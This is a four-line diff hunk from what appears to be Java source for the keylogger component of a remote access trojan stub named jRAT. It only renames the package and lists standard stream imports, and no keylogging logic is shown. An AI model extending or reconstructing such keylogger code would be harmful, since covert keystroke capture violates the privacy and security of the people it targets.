@@ -1,4 +1,4 @@
-package org.jrat.project.stub.keylogger;
+package pro.jrat.stub.keylogger;
 
 import java.io.DataInputStream;
 import java.io.DataOutputStream;
